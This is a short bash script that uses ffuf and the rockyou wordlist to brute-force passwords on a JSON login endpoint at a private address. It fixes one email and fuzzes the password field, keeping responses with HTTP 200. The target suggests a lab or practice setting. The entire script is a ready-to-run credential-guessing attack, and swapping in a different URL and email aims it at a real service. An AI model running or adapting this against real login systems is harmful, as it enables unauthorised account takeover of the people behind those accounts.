#!/bin/bash

ffuf -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email": "4.3@example.com", "password": "FUZZ"}' \
     -u http://192.168.200.1:8082/auth/login \
     -mc 200
